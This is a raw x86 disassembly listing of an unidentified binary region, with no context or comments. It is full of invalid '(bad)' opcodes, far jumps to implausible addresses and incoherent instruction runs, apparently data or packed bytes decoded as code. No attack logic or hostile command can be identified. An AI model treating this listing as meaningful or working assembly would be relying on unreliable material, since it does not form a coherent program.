  404cb7:	jae    0x404ce4
  404cb9:	test   BYTE PTR [ecx+0x2a],0x3
  404cbd:	add    BYTE PTR [ecx],dh
  404cbf:	or     DWORD PTR [edx-0x45],esp
  404cc2:	dec    esi
  404cc3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404cc4:	push   ds
  404cc5:	pushf  
  404cc6:	xor    ebx,DWORD PTR ds:0x949283e3
  404ccc:	pop    esp
  404ccd:	inc    edx
  404cce:	xor    DWORD PTR [ecx],ecx
  404cd0:	stos   BYTE PTR es:[edi],al
  404cd1:	sub    esp,DWORD PTR [edi]
  404cd3:	xchg   ebx,eax
  404cd4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404cd5:	(bad)  
  404cd6:	jmp    0x4435ec
  404cdb:	xor    edx,ebx
  404cdd:	sbb    bh,BYTE PTR [eax-0x4ee8f0]
  404ce3:	clc    
  404ce4:	push   0x79
  404ce6:	xor    DWORD PTR [eax+0x9],0x94ad1960
  404ced:	sub    BYTE PTR [ecx+ecx*1],al
  404cf0:	inc    edx
  404cf1:	jmp    0x29a87df9
  404cf6:	xor    DWORD PTR [eax+0x9],0x94751962
  404cfd:	sub    BYTE PTR [edx+ebp*4],al
  404d00:	adc    al,0x31
  404d02:	xor    DWORD PTR [eax+0x9],0xd336bbee
  404d09:	out    0xbc,al
  404d0b:	xchg   edx,eax
  404d0c:	dec    ecx
  404d0d:	pop    esp
  404d0e:	inc    ebp
  404d0f:	xor    DWORD PTR [eax+0x48bc47dc],edx
  404d15:	jmp    0x64918196
  404d1a:	inc    ebp
  404d1b:	xor    DWORD PTR [eax+0x1d],ebp
  404d1e:	xor    eax,0xe1197208
  404d24:	xchg   ebx,eax
  404d25:	test   al,0x3
  404d27:	ss shl esi,1
  404d2a:	mov    ecx,0x455c55d2
  404d2f:	xor    DWORD PTR [eax+0x48bc53dc],edx
  404d35:	jmp    0xe68a53
  404d3a:	mov    esp,0x5c403142
  404d3f:	add    ah,ch
  404d41:	or     al,ch
  404d43:	fwait
  404d44:	xchg   esi,eax
  404d45:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404d46:	inc    edx
  404d48:	hlt    
  404d49:	inc    ebp
  404d4a:	leave  
  404d4b:	sub    esi,DWORD PTR [ecx]
  404d4d:	or     DWORD PTR [ebp+0x62],edx
  404d50:	xchg   ecx,eax
  404d51:	mov    al,ah
  404d53:	add    DWORD PTR [ecx+eiz*4-0x6e280101],ebx
  404d5a:	add    al,0x24
  404d5c:	mov    ecx,0x9be94193
  404d61:	std    
  404d62:	int3   
  404d63:	xor    DWORD PTR [ecx-0x3511ffb9],0x3660ca15
  404d6d:	aam    0x94
  404d6f:	pop    esp
  404d70:	ins    DWORD PTR es:[edi],dx
  404d71:	or     DWORD PTR [ecx-0x727f0e23],ecx
  404d77:	sub    BYTE PTR ds:0x4d947548,ch
  404d7d:	leave  
  404d7e:	jmp    FWORD PTR [esi+0x74049187]
  404d84:	dec    edx
  404d85:	xchg   edi,eax
  404d86:	inc    ecx
  404d87:	jmp    0x1dcd4ad7
  404d8c:	aas    
  404d8d:	dec    eax
  404d8e:	add    dl,bl
  404d90:	cs xchg esp,eax
  404d92:	pop    esp
  404d93:	ja     0x404d8a
  404d95:	or     BYTE PTR [ebx],dh
  404d97:	aad    0xb1
  404d99:	cmp    al,0x8e
  404d9b:	sub    BYTE PTR ds:0x7298c1da,dh
  404da1:	pop    DWORD PTR [esp+esi*2]
  404da4:	add    BYTE PTR [esi-0x1216be6a],ah
  404daa:	sbb    edx,esi
  404dac:	bound  esp,QWORD PTR [ecx]
  404dae:	dec    ecx
  404daf:	lea    ebp,[eax+0x359232]
  404db5:	pushf  
  404db6:	mov    BYTE PTR [ecx+0x0],al
  404db9:	jecxz  0x404d53
  404dbb:	inc    edi
  404dbc:	lea    ecx,[ecx-0x4bca00f7]
  404dc2:	mov    BYTE PTR [ecx+0x0],al
  404dc5:	(bad)  
  404dc6:	push   eax
  404dc7:	cld    
  404dc8:	call   FWORD PTR [ebp+0x39]
  404dcb:	lea    eax,[ecx+0x48]
  404dce:	es inc ebp
  404dd0:	clc    
  404dd1:	loope  0x404d58
  404dd3:	(bad)  
  404dd4:	push   DWORD PTR [edi]
  404dd6:	pop    ds
  404dd7:	(bad)  
  404dd8:	mov    ecx,DWORD PTR [edi+0x5b]
  404ddb:	shl    BYTE PTR [ebx],cl
  404ddd:	dec    esi
  404dde:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404ddf:	push   esp
  404de0:	cld    
  404de1:	adc    ecx,ebx
  404de3:	add    eax,DWORD PTR [eax*4+0x18418d31]
  404dea:	or     al,BYTE PTR [ebp-0x8]
  404ded:	or     eax,0x42827990
  404df2:	jbe    0x404e69
  404df4:	cld    
  404df5:	addr16 dec esp
  404df7:	clc    
  404df8:	mov    DWORD PTR ds:0x6c6c159,esp
  404dfe:	and    bh,dh
  404e00:	mov    ebx,DWORD PTR [ebx-0x24fa3c38]
  404e06:	rol    BYTE PTR [ecx+0x75],1
  404e09:	add    BYTE PTR [eax+esi*1+0x76a7ffec],dl
  404e10:	mov    eax,esi
  404e12:	push   ebx
  404e13:	mov    esi,0x9ab44533
  404e18:	rol    DWORD PTR [ebx],0x8c
  404e1b:	and    esi,esp
  404e1d:	lea    ecx,[ecx+0xd]
  404e20:	add    eax,DWORD PTR [ebp+0x20]
  404e23:	or     al,0xa1
  404e25:	jmp    0x404e18
  404e27:	add    bh,bh
  404e29:	jne    0x404e0f
  404e2b:	and    eax,0x2931f845
  404e30:	das    
  404e31:	cld    
  404e32:	jo     0x404e20
  404e34:	or     eax,0xb1176f8b
  404e39:	shl    DWORD PTR [edx-0x53],0x0
  404e3d:	fdiv   st,st(0)
  404e3f:	sar    DWORD PTR fs:[ecx-0x530cbb],cl
  404e46:	mov    edx,0x455578f3
  404e4b:	xchg   edi,eax
  404e4c:	inc    esi
  404e4d:	cld    
  404e4e:	adc    ah,bl
  404e50:	loopne 0x404e17
  404e52:	sub    dh,al
  404e54:	add    BYTE PTR [esp+edi*4],al
  404e57:	jne    0x404ed6
  404e59:	inc    ecx
  404e5a:	xor    DWORD PTR [edi-0x1cb07ba],ebp
  404e60:	outs   dx,DWORD PTR ds:[esi]
  404e61:	sbb    esp,DWORD PTR [esi-0x4103c94e]
  404e67:	hlt    
  404e68:	stos   DWORD PTR es:[edi],eax
  404e69:	mov    DWORD PTR [esi+eax*8+0x1f00c6c2],eax
  404e70:	daa    
  404e71:	lods   eax,DWORD PTR ds:[esi]
  404e72:	mov    eax,DWORD PTR [edx]
  404e74:	jno    0x404e36
  404e76:	add    eax,0x75426a32
  404e7b:	cli    
  404e7c:	mov    BYTE PTR [edi+0x785adeff],bl
  404e82:	(bad)  
  404e83:	stos   BYTE PTR es:[edi],al
  404e84:	jp     0x404e76
  404e86:	inc    esp
  404e87:	int    0xbe
  404e89:	rol    DWORD PTR [ebx],0x2d
  404e8c:	xor    eax,0xb2708e97
  404e91:	add    BYTE PTR [ebp-0x47],al
  404e94:	lods   al,BYTE PTR ds:[esi]
  404e95:	aad    0xc1
  404e97:	adc    ebx,DWORD PTR [eax-0x54]
  404e9a:	jne    0x404e41
  404e9c:	xor    al,BYTE PTR [esi-0x8]
  404e9f:	test   al,0x9c
  404ea1:	scas   eax,DWORD PTR es:[edi]
  404ea2:	shr    DWORD PTR [edi-0x2d],0x78
  404ea6:	(bad)  
  404ea7:	mov    edx,0x72c25a08
  404eac:	or     eax,0x1df0cbea
  404eb1:	cmp    DWORD PTR [edx],eax
  404eb3:	adc    al,0x49
  404eb5:	pop    esp
  404eb6:	inc    edx
  404eb7:	xor    DWORD PTR [edx],ecx
  404eb9:	cld    
  404eba:	inc    edi
  404ebb:	mov    ah,0x49
  404ebd:	jmp    0x64916ac4
  404ec2:	inc    edx
  404ec3:	xor    DWORD PTR [eax+0xe30afa4],edx
  404ec9:	mov    ch,0x7e
  404ecb:	lock or BYTE PTR [edx+0x46],dh
  404ecf:	cmp    DWORD PTR [ecx],ecx
  404ed1:	in     al,dx
  404ed2:	push   ebx
  404ed3:	add    BYTE PTR [ecx+ecx*2+0x3cf2bae9],ah
  404eda:	jb     0x404e7b
  404edc:	es sbb eax,0xd2579bf1
  404ee2:	jmp    0xeee200ea
  404ee7:	xor    eax,0xfc5ca257
  404eec:	push   cs
  404eed:	add    ebp,DWORD PTR [esi-0x56f1cefc]
  404ef3:	xor    DWORD PTR [esi],ebp
  404ef5:	popa   
  404ef6:	into   
  404ef7:	stos   DWORD PTR es:[edi],eax
  404ef8:	out    dx,al
  404ef9:	mov    ds:0x49ba17d2,al
  404efe:	in     eax,dx
  404eff:	xchg   ebx,eax
  404f00:	sub    cl,cl
  404f02:	cmp    al,0x3
  404f04:	cdq    
  404f05:	mov    ds:0xaeceabae,al
  404f0a:	in     eax,dx
  404f0b:	jle    0x404f3e
  404f0d:	mov    gs,ecx
  404f0f:	mov    esp,0x50e90df3
  404f14:	stos   BYTE PTR es:[edi],al
  404f15:	mov    ch,0x6a
  404f17:	shl    BYTE PTR [ecx+0x1bceba36],0xb
  404f1e:	adc    eax,DWORD PTR ds:0x8100070b
  404f24:	mov    edx,0xb7e900d3
  404f29:	mov    eax,ds:0xae2cdcff
  404f2e:	bound  esi,QWORD PTR [edx+0x6d]
  404f31:	das    
  404f32:	adc    BYTE PTR [eax+esi*8-0x68],ah
  404f36:	push   eax
  404f37:	inc    ecx
  404f38:	add    BYTE PTR [eax],dl
  404f3a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404f3b:	inc    DWORD PTR [esi+0x13]
  404f3e:	retf   0x3945
  404f41:	aaa    
  404f42:	or     DWORD PTR [ebx-0x3274bd5c],ecx
  404f48:	(bad)  
  404f49:	int    0x53
  404f4b:	repnz push 0x18
  404f4e:	adc    eax,0x8e319500
  404f53:	inc    ebp
  404f54:	in     eax,0x97
  404f56:	add    al,BYTE PTR [ebx+0x74a2268c]
  404f5c:	repz scas eax,DWORD PTR es:[edi]
  404f5e:	and    ecx,DWORD PTR [eax]
  404f60:	jmp    0xcd2b5cc6
  404f65:	mov    bh,0x11
  404f67:	push   DWORD PTR [edx+ecx*1-0x56]
  404f6b:	ins    BYTE PTR es:[edi],dx
  404f6c:	out    0xdb,al
  404f6e:	mov    eax,ds:0x1bcbe183
  404f73:	add    al,dl
  404f75:	es nop
  404f77:	inc    ebp
  404f78:	aad    0x4c
  404f7a:	stc    
  404f7b:	mov    WORD PTR [ebx*4-0x522eacc8],gs
  404f82:	rol    BYTE PTR [eax],cl
  404f84:	jmp    0x353ff038
  404f89:	int    0x36
  404f8b:	call   0x48d80d
  404f90:	(bad)  
  404f92:	(bad)  
  404f93:	ret    
  404f94:	xor    dh,BYTE PTR [esi+eax*8+0xc]
  404f98:	jmp    0x12cdd9e
  404f9d:	add    BYTE PTR [ebx+0x36],cl
  404fa0:	cmp    DWORD PTR [ebp+0x78],0x5
  404fa4:	jne    0x404fb1
  404fa6:	pusha  
  404fa7:	or     eax,0x4e980000
  404fac:	pop    ebx
  404fad:	leave  
  404fae:	pop    edx
  404faf:	call   0xba:0x995d8aff
  404fb6:	mov    BYTE PTR ds:0x6e586a00,al
  404fbc:	jne    0x404fce
  404fbe:	(bad)  
  404fbf:	outs   dx,BYTE PTR ds:[esi]
  404fc0:	jne    0x404fca
  404fc2:	add    cl,ch
  404fc4:	int    0x0
  404fc6:	dec    eax
  404fc7:	mov    al,al
  404fc9:	jle    0x40502f
  404fcb:	or     bh,al
  404fcd:	sub    DWORD PTR [ebp+0x387d82f5],edx
  404fd3:	add    eax,0xce30775
  404fd8:	add    BYTE PTR [eax],al
  404fda:	sbb    BYTE PTR [eax+0x1f52eb02],al
  404fe0:	ret    
  404fe1:	pop    edi
  404fe2:	rcr    DWORD PTR [ebp-0x3e],cl
  404fe5:	or     al,0x8
  404fe7:	cmp    cl,BYTE PTR [ebx-0xb9f6614]
  404fed:	dec    BYTE PTR [edi]
  404fef:	jae    0x404ff0
  404ff1:	jne    0x404fff
  404ff3:	and    al,BYTE PTR [ebp-0x8d210c]
  404ff9:	(bad)  
  404ffa:	push   ebp
  404ffb:	ins    DWORD PTR es:[edi],dx
  404ffc:	(bad)  
  404ffd:	(bad)  
  404ffe:	out    dx,eax
  404fff:	add    eax,0xc8000000
  405004:	leave  
  405005:	test   esp,edi
  405007:	sahf   
  405008:	jb     0x405009
  40500a:	add    eax,ebx
  40500c:	or     al,0x0
  40500e:	lea    edx,[ebp+0x5]
  405011:	(bad)  
  405012:	call   FWORD PTR [edi+0x31087572]
  405018:	daa    
  405019:	add    al,0x8d
  40501b:	mov    ah,0x76
  40501d:	stos   BYTE PTR es:[edi],al
  40501e:	jmp    DWORD PTR [esi+0xb001e02]
  405024:	mov    dl,0x76
  405026:	test   DWORD PTR [ebp-0x1e0056e8],edx
  40502c:	or     eax,DWORD PTR [eax+ebp*8]
  40502f:	xor    al,bl
  405031:	add    eax,DWORD PTR [eax]
  405033:	mov    dl,0x2a
  405035:	test   eax,0xc3ab2d74
  40503a:	jne    0x405071
  40503c:	add    eax,esp
  40503e:	jmp    0x40506c
  405040:	mov    al,BYTE PTR [ebx]
  405042:	add    BYTE PTR [ecx],dh
  405044:	mov    dl,0xba
  405046:	ret    0xb229
  405049:	dec    esi
  40504a:	mov    ebx,DWORD PTR [ebp+0x33]
  40504d:	sar    ah,0xe2
  405050:	mov    edx,0xfedb6acc
  405055:	or     BYTE PTR cs:[ecx+0x25],cl
  405059:	test   eax,0xc3ab2eff
  40505e:	je     0x4050dd
  405060:	jl     0x4050af
  405062:	jmp    DWORD PTR [edx+ebx*4+0x16007f9b]
  405069:	xchg   edi,eax
  40506a:	test   al,0xb
  40506c:	icebp  
  40506d:	adc    al,0x5
  40506f:	jmp    0x4050de
  405071:	cmp    al,0x4
  405073:	push   0x30
  405075:	sub    eax,0xb761ff3e
  40507a:	cs or  cl,bl
  40507d:	jnp    0x405035
  40507f:	add    BYTE PTR [ecx],dh
  405081:	sub    eax,0x1b217ec3
  405086:	ds adc al,0x19
  405089:	in     eax,dx
  40508a:	test   al,0x75
  40508c:	xor    esp,DWORD PTR [ebx]
  40508e:	add    cl,BYTE PTR [ebx+0x7cf5095c]
  405094:	and    esi,DWORD PTR [ebx]
  405096:	jmp    0x2cce80b8
  40509b:	test   eax,0xf814a001
  4050a0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4050a1:	cmp    bl,cl
  4050a3:	test   al,0x24
  4050a5:	or     eax,0x9f795c91
  4050aa:	jbe    0x405098
  4050ac:	cmc    
  4050ad:	clc    
  4050ae:	cli    
  4050af:	add    eax,0xcc6c049a
  4050b4:	add    eax,0xdac4726d
  4050b9:	shr    DWORD PTR [ebx],1
  4050bb:	rdtsc  
  4050bd:	bound  edx,QWORD PTR ss:[edi-0x54163b50]
  4050c4:	pop    esi
  4050c5:	lahf   
  4050c6:	call   0xa8:0x93327bdc
  4050cd:	les    edx,FWORD PTR [eax]
  4050cf:	inc    ecx
  4050d0:	or     eax,DWORD PTR [esi-0x61]
  4050d3:	es cld 
  4050d5:	jle    0x4050eb
  4050d7:	xchg   BYTE PTR ds:0xfb9c9fdb,bl
  4050dd:	push   ss
  4050de:	adc    al,0xe
  4050e0:	test   al,0x26
  4050e2:	adc    ebp,DWORD PTR [ecx]
  4050e4:	xor    esi,DWORD PTR cs:[edx-0x66b7d6a]
  4050eb:	call   0x77df5feb
  4050f0:	add    cl,cl
  4050f2:	or     ecx,esi
  4050f4:	add    esi,DWORD PTR [ecx]
  4050f6:	mov    dl,0xea
  4050f8:	jp     0x405166
  4050fa:	stc    
  4050fb:	inc    edx
  4050fc:	add    al,0x81
  4050fe:	mov    WORD PTR [esp+eax*1-0x17],fs
  405102:	sahf   
  405103:	(bad)  
  405104:	push   esp
  405105:	ficom  WORD PTR [ecx+esi*8]
  405108:	fwait
  405109:	and    esp,ecx
  40510b:	add    cl,ch
  40510d:	xor    al,BYTE PTR [eax+eax*8+0x2cb23330]
  405114:	sbb    al,0x32
  405116:	dec    edx
  405117:	jmp    0x4050df
  405119:	bound  edx,QWORD PTR [edx-0x4d41aab]
  40511f:	imul   ebp,ecx,0xe9858c02
  405125:	retf   0xff9e
  405128:	sbb    esi,ecx
  40512a:	adc    al,0xc
  40512c:	jbe    0x405111
  40512e:	clc    
  40512f:	push   edi
  405130:	rol    BYTE PTR [eax],0xf1
  405133:	clc    
  405134:	and    ah,0x22
  405137:	or     DWORD PTR [ebp-0x16],esi
  40513a:	repz mov cl,0x4
  40513d:	ins    BYTE PTR es:[edi],dx
  40513e:	jp     0x405155
  405140:	cdq    
  405141:	bound  esi,QWORD PTR [edx+0x42]
  405144:	leave  
  405145:	sub    ebx,DWORD PTR [ecx-0x62]
  405148:	push   esp
  405149:	jb     0x405104
  40514b:	mov    al,ah
  40514d:	xor    esi,edi
  40514f:	fsin   
  405151:	ret    
  405152:	xor    dh,BYTE PTR [esi]
  405154:	call   FWORD PTR [edx+edi*1-0x71c93b5a]
  40515b:	sahf   
  40515c:	(bad)  
  40515d:	lods   al,BYTE PTR ds:[esi]
  40515e:	(bad)  
  40515f:	or     BYTE PTR [eax],al
  405161:	jmp    0xf195e398
  405166:	fwait
  405167:	sti    
  405168:	mov    WORD PTR [edx+ecx*8-0x761295c8],fs
  40516f:	inc    esp
  405170:	cld    
  405171:	cdq    
  405172:	iret   
  405173:	adc    ecx,DWORD PTR [eax]
  405175:	out    0x60,al
  405177:	or     eax,0x9d496847
  40517c:	or     eax,0x740fe9e3
  405181:	jecxz  0x405136
  405183:	sbb    edi,eax
  405185:	add    al,cl
  405187:	fmul   st,st(0)
  405189:	xor    ecx,DWORD PTR [eax-0x6074fa7e]
  40518f:	mov    al,al
  405191:	add    esi,DWORD PTR [edi]
  405193:	pop    esp
  405194:	ret    0x4
  405197:	enter  0x8b38,0xec
  40519b:	dec    ebx
  40519c:	pop    esi
  40519d:	hlt    
  40519e:	push   ebx
  40519f:	outs   dx,DWORD PTR ds:[esi]
  4051a0:	std    
  4051a1:	xchg   edi,eax
  4051a2:	cmp    bl,BYTE PTR [eax-0x281317f7]
  4051a8:	dec    WORD PTR [ecx+0x458d714d]
  4051af:	or     al,0x3a
  4051b1:	call   0xffa6f0df
  4051b6:	xor    esi,ebx
  4051b8:	call   FWORD PTR ds:0x1826a
  4051be:	cli    
  4051bf:	pop    eax
  4051c0:	or     edi,edi
  4051c2:	jne    0x4051c0
  4051c4:	data16 jne 0x4051cf
  4051c7:	add    BYTE PTR [esi],bl
  4051c9:	(bad)  
  4051ca:	call   DWORD PTR [edi]
  4051cc:	mov    eax,eax
  4051ce:	paddusb mm3,QWORD PTR [ecx+0x66580000]
  4051d5:	jne    0x4051cb
  4051d7:	and    bh,ah
  4051d9:	(bad)  
  4051da:	call   DWORD PTR [edi]
  4051dc:	mov    cl,0xff
  4051de:	stc    
  4051df:	sbb    BYTE PTR [ecx],cl
  4051e1:	jbe    0x4051e8
  4051e3:	xor    DWORD PTR [ecx+eax*1],eax
  4051e6:	add    BYTE PTR [eax],cl
  4051e8:	fs jne 0x4051df
  4051eb:	inc    eax
  4051ec:	push   edx
  4051ed:	(bad)  
  4051ee:	inc    DWORD PTR [edi]
  4051f0:	sbb    eax,0x634c74c0
  4051f5:	jne    0x4051eb
  4051f7:	loopne 0x40521a
  4051f9:	fcos   
  4051fb:	add    bh,dl
  4051fd:	and    dl,BYTE PTR [ebp-0xc]
  405200:	xor    DWORD PTR [edi],esp
  405202:	adc    ch,BYTE PTR [edx+0x31]
  405205:	dec    edx
  405206:	lock and BYTE PTR [ecx],dh
  405209:	mov    dl,0xa4
  40520b:	jne    0x4051e2
  40520d:	pop    ebx
  40520e:	das    
  40520f:	hlt    
  405210:	into   
  405211:	add    al,bh
  405213:	(bad)  
  405214:	ins    BYTE PTR es:[edi],dx
  405215:	pop    edx
  405216:	add    al,0x0
  405218:	xor    DWORD PTR [edx-0xe99c8e5],esi
  40521e:	add    edi,edi
  405220:	and    al,0x76
  405222:	pushf  
  405223:	into   
  405224:	jp     0x4051d8
  405226:	add    edx,DWORD PTR [ebx+0x2a]
  405229:	jb     0x40525b
  40522b:	ss stos BYTE PTR es:[edi],al
  40522d:	mov    bl,BYTE PTR [edi+esi*1]
  405230:	(bad)  
  405231:	lock add ebp,eax
  405234:	es push 0x2a320004
  40523a:	dec    ebp
  40523b:	inc    edi
  40523c:	stos   BYTE PTR es:[edi],al
  40523d:	fld    TBYTE PTR [edx-0x6c]
  405240:	inc    eax
  405241:	mov    dl,0x3
  405243:	mov    al,0x34
  405245:	inc    eax
  405246:	push   esi
  405247:	mov    eax,0x3c1c5
  40524c:	or     dh,cl
  40524e:	mov    ebp,0x4cb24e47
  405253:	push   ebx
  405254:	pop    ecx
  405255:	mov    bh,BYTE PTR [ecx+0x3f193100]
  40525b:	clc    
  40525c:	(bad)  
  40525d:	jecxz  0x40529b
  40525f:	inc    DWORD PTR [eax]
  405261:	cmp    al,0x53
  405263:	dec    eax
  405264:	push   0x427b6e
  405269:	push   ds
  40526a:	sbb    eax,0xd6ace8a7
  40526f:	add    eax,DWORD PTR [eax]
  405271:	bound  esp,QWORD PTR [edi+0x276d74c3]
  405277:	lods   al,BYTE PTR ds:[esi]
  405278:	push   0x43360976
  40527d:	xor    DWORD PTR [ecx+0x931bab7],esi
  405283:	jmp    0x98c4:0x62447eab
  40528a:	je     0x405264
  40528c:	add    esi,DWORD PTR [ecx]
  40528e:	pop    ecx
  40528f:	in     al,dx
  405290:	mov    cl,0x9f
  405292:	pusha  
  405293:	pop    ebp
  405294:	adc    dh,BYTE PTR [ecx]
  405296:	or     DWORD PTR [edx],eax
  405298:	ret    
  405299:	test   DWORD PTR [ebx-0x5a],0x91385e03
  4052a0:	pusha  
  4052a1:	lahf   
  4052a2:	fwait
  4052a3:	xchg   esi,eax
  4052a4:	js     0x4052a2
  4052a6:	clc    
  4052a7:	loope  0x40527a
  4052a9:	and    eax,0x8a017005
  4052ae:	add    bl,BYTE PTR [ecx]
  4052b0:	pushf  
  4052b1:	jg     0x40526d
  4052b3:	jbe    0x405259
  4052b5:	out    0xc2,al
  4052b7:	movs   DWORD PTR es:[edi],DWORD PTR es:[esi]
  4052b9:	sub    al,0x3c
  4052bb:	ret    0xfca4
  4052be:	xchg   esp,eax
  4052bf:	push   ecx
  4052c0:	fisttp DWORD PTR [ecx+0x80569b]
  4052c6:	in     al,0xa0
  4052c8:	jmp    0xad0488f9
  4052cd:	stos   DWORD PTR es:[edi],eax
  4052ce:	xor    DWORD PTR [ecx],ecx
  4052d0:	mov    DWORD PTR [ebx],eax
  4052d2:	dec    esi
  4052d3:	adc    eax,0x94bca431
  4052d8:	cs sub DWORD PTR cs:[ecx-0x64c959f2],esi
  4052e0:	push   ds
  4052e1:	cs and eax,0x26cd91b2
  4052e7:	fwait
  4052e8:	loop   0x4052ad
  4052ea:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4052eb:	pop    es
  4052ec:	adc    cl,BYTE PTR [eax]
  4052ee:	sub    cl,cl
  4052f0:	jne    0x4052fe
  4052f2:	mov    edx,0x7efd0034
  4052f7:	idiv   esi
  4052f9:	je     0x405301
  4052fb:	pushf  
  4052fc:	jne    0x4052db
  4052fe:	shl    BYTE PTR [edi],cl
  405300:	xor    al,0x64
  405302:	cmc    
  405303:	and    DWORD PTR ds:0x92c92,eax
  405309:	jmp    0x733487bd
  40530e:	fistp  WORD PTR [ebx+0x3792b575]
  405314:	or     BYTE PTR [esi+0x41e89d28],dh
  40531a:	repz call 0xb05b:0x3aee72ff
  405322:	ja     0x405331
  405324:	add    BYTE PTR [esi+esi*4],bh
  405327:	lods   eax,DWORD PTR ds:[esi]
  405328:	and    DWORD PTR [ebp+0x53320500],0xffffffd2
  40532f:	xlat   BYTE PTR ds:[ebx]
  405330:	xor    DWORD PTR [eax],eax
  405332:	leave  
  405333:	xor    cl,BYTE PTR [ecx]
  405335:	call   0xffdac644
  40533a:	pusha  
  40533b:	call   0x9329bbdc
  405340:	call   0x56ff:0xbb2b51ff
  405347:	mov    ah,0x44
  405349:	mov    ah,0xc1
  40534b:	xor    ch,cl
  40534d:	(bad)  
  40534e:	call   0x3f1ea3dd
  405353:	xchg   edx,eax
  405354:	nop
  405355:	inc    ebp
  405356:	jne    0x4052f8
  405358:	sbb    al,0xc0
  40535a:	jo     0x4053ad
  40535c:	call   0x53f3:0x5a5fe9ff
  405363:	cli    
  405364:	inc    ebx
  405365:	rcl    ch,0x32
  405368:	or     DWORD PTR [eax],eax
  40536a:	es push 0xf00ffb5
  405370:	push   es
  405371:	add    bh,al
  405373:	aad    0x75
  405375:	call   FWORD PTR [edi]
  405377:	sbb    BYTE PTR [esi],al
  405379:	push   DWORD PTR [ebp+0xc]
  40537c:	ja     0x4053c3
  40537e:	ror    BYTE PTR [edi],1
  405380:	add    DWORD PTR [edi+ecx*4+0x458d5915],esi
  405387:	cwde   
  405388:	aad    0x67
  40538a:	add    al,cl
  40538c:	add    eax,0xc8006a80
  405391:	data16 jne 0x40539c
  405394:	loopne 0x405374
  405396:	leave  
  405397:	add    al,bl
  405399:	or     al,al
  40539b:	je     0x405373
  40539d:	cmp    BYTE PTR [ebp-0x30],0xc8
  4053a1:	add    BYTE PTR ds:0x5dee9,al
  4053a7:	add    bh,dl
  4053a9:	push   eax
  4053aa:	mov    al,0xff
  4053ac:	pop    DWORD PTR ds:0x35458d00
  4053b2:	push   eax
  4053b3:	inc    DWORD PTR [ebp-0x67ff97c7]
  4053b9:	add    eax,0xc5558d80
  4053be:	push   eax
  4053bf:	call   0x411ede
  4053c4:	arpl   bp,ax
  4053c6:	jne    0x4053cd
  4053c8:	icebp  
  4053c9:	sub    al,0x0
  4053cb:	add    BYTE PTR [eax-0x76],cl
  4053ce:	inc    ebp
  4053cf:	mov    ah,0x6
  4053d1:	push   es
  4053d2:	add    BYTE PTR [ebp+0x3cb9c58d],cl
  4053d8:	pop    eax
  4053d9:	add    eax,0x73083300
  4053de:	stos   BYTE PTR es:[edi],al
  4053df:	mov    DWORD PTR [ebp+0x18003cc5],0x3175ff0d
  4053e9:	ss xchg edx,eax
  4053eb:	inc    ebp
  4053ec:	or     eax,0x16d447f0
  4053f1:	mov    al,0x3
  4053f3:	add    BYTE PTR [eax],al
  4053f5:	imul   BYTE PTR [ebp-0x6d]
  4053f8:	jmp    DWORD PTR [esi]
  4053fa:	mov    ds:0xe2748d03,al
  4053ff:	xor    ch,BYTE PTR [edx+0x31]
  405402:	cmp    al,0x4
  405404:	jmp    DWORD PTR [esi+esi*2-0x54]
  405408:	out    0xf8,al
  40540a:	mov    ds:0x3ef10b03,al
  40540f:	or     al,BYTE PTR [ebx+0x75047254]
  405415:	xor    edi,DWORD PTR [ebx+0x5e3cff24]
  40541b:	mov    eax,ds:0x334a8575
  405420:	dec    edi
  405421:	jo     0x4053c5
  405423:	mov    al,ds:0x1b7aed75
  405428:	leave  
  405429:	xor    DWORD PTR [edx-0x48be3b7c],esp
  40542f:	pop    eax
  405430:	inc    ebp
  405431:	jns    0x405425
  405433:	sub    eax,0x9f9d8e00
  405438:	call   0xffe170d4
  40543d:	sub    ah,BYTE PTR [edx+0x17]
  405440:	add    cl,BYTE PTR [edx-0x56ba750b]
  405446:	aaa    
  405447:	pop    ss
  405448:	mov    esp,0xcb9459
  40544d:	xor    DWORD PTR [edx-0x60],edx
  405450:	jne    0x4053e7
  405452:	dec    edi
  405453:	pop    ss
  405454:	mov    eax,0xff9c7d59
  405459:	add    BYTE PTR [esi-0x55],al
  40545c:	ret    
  40545d:	jne    0x405492
  40545f:	dec    ebx
  405460:	hlt    
  405461:	(bad)  
  405462:	mov    esp,0xa4a0f908
  405467:	add    eax,0xa0e9171e
  40546c:	fcomp  QWORD PTR [esi-0x439d67e2]
  405472:	push   ss
  405473:	push   ds
  405474:	inc    ecx
  405475:	lods   al,BYTE PTR ds:[esi]
  405476:	repz shr ecx,0x3
  40547a:	push   es
  40547b:	push   ds
  40547c:	cmp    eax,0xeeb62bac
  405481:	mov    al,ds:0xaba51df6
  405486:	xor    esi,DWORD PTR [esi+0x1de6a0de]
  40548c:	aad    0xab
  40548e:	(bad)  [esi+ecx*8+0x22cbaaa0]
  405495:	inc    ecx
  405496:	clc    
  405497:	retf   0x3ed
  40549a:	pop    esp
  40549b:	test   ch,al
  40549d:	test   ch,dh
  40549f:	xchg   esp,eax
  4054a0:	bound  eax,QWORD PTR [esi+0x25]
  4054a3:	add    al,0xa9
  4054a5:	pop    ss
  4054a6:	aaa    
  4054a7:	shr    cl,1
  4054a9:	add    esi,DWORD PTR [ecx]
  4054ab:	or     ecx,ebp
  4054ad:	enter  0x94f4,0xe9
  4054b1:	add    esi,DWORD PTR [ecx]
  4054b3:	or     DWORD PTR [esi+eax*2-0x73],esi
  4054b7:	cmp    BYTE PTR [esi+0x16],bh
  4054ba:	xor    eax,0xbfc98
  4054bf:	mov    DWORD PTR [ecx],esp
  4054c1:	outs   dx,DWORD PTR ds:[esi]
  4054c2:	mov    al,ds:0x9fe48b76
  4054c7:	xor    DWORD PTR ds:0x98312df6,ebx
  4054cd:	fmul   QWORD PTR [edi]
  4054cf:	pop    esi
  4054d0:	sbb    eax,0x96ffab4d
  4054d5:	inc    esi
  4054d6:	mov    al,ds:0x9fb497e1
  4054db:	pop    ecx
  4054dc:	add    BYTE PTR gs:0x20589791,dl
  4054e3:	ins    BYTE PTR es:[edi],dx
  4054e4:	add    BYTE PTR [eax],al
  4054e6:	mov    esp,0x2583a5bd
  4054eb:	(bad)  
  4054ec:	das    
  4054ed:	(bad)  
